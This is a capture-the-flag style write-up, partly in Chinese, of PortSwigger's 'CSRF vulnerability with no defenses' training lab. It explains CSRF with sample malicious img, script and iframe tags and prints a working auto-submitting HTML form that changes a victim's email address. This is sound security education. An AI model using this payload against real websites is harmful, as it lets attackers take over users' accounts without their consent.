# CSRF - APPRENTICE
###### tags: `Portswigger Web Security Academy` `Web`
[TOC]
## Lab: CSRF vulnerability with no defenses
* Description: This lab's email change functionality is vulnerable to CSRF. 
* Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. 
You can log in to your own account using the following credentials: `wiener:peter`
* Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Background
:::spoiler
[CSRF 攻擊原理](https://medium.com/@Tommmmm/csrf-攻擊原理-d0f2a51810ca)
[[Day25]- 新手的Web系列CSRF](https://ithelp.ithome.com.tw/articles/10251769)
>1. 使用者登入網站
>2. 使用者透過身份驗證在本機形成cookie
>3. 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下html程式碼的網頁：`<img src=http://www.***.com/transfer.php?id=5&money=22>`
>4. 惡意程式碼利用使用者的身份發請求，即執行CSRF
>5. 使用者的帳號少錢錢勒QQ
>
> ![](https://i.imgur.com/gwCvSqZ.png)
>---
>>常見的CSRF方法
>* HTML標籤
>    * `<img>`標籤屬性
>        ```html
>        <img src="惡意連結">
>        ```
>    以GET方式請求第三方網站，瀏覽器會帶上使用者的cookie發出GET請求
>    
>    * `<script>`標籤屬性
>        ```javascript
>        `<script src="惡意連結">`
>        ```
>    * `<iframe>`標籤屬性
>        ```html
>        `<iframe src="惡意連結">`
>        ```
:::

## Recon
1. According to the description
It said the email change function has some CSRF exploitation. So, maybe I can login by username and password they provided.
![](https://i.imgur.com/YW4dJqa.png)
2. Find where has CSRF
Then I tried to change my email and trace the package
![](https://i.imgur.com/z2AXOk1.png)

3. Then we can forge a website and let our victim to access
In this lab, PortSwigger provided an exploited server that can simulate a victim to access.

## Exp
Directly create CSRF PoC by Burp Suit
![](https://i.imgur.com/oY6NlZE.png)

Exploit Payload:
```javascript=
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/')</script>

    <form action="https://0a050071049c31f4815898e900330005.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="danger&#64;gmail&#46;com" />
    </form>
    <script>
          document.forms[0].submit();
    </script>
  </body>
</html>
```
:::spoiler Success Screenshot
![](https://i.imgur.com/nlgu1Oa.png)
:::

## Reference
[Burp Suite Security Academy Writeup](https://github.com/frank-leitner/portswigger-websecurity-academy)
[从0到1完全掌握 CSRF](https://zhuanlan.zhihu.com/p/517735618)
[Lab: CSRF vulnerability with no defenses - write up](https://blog.csdn.net/ZripenYe/article/details/120793709)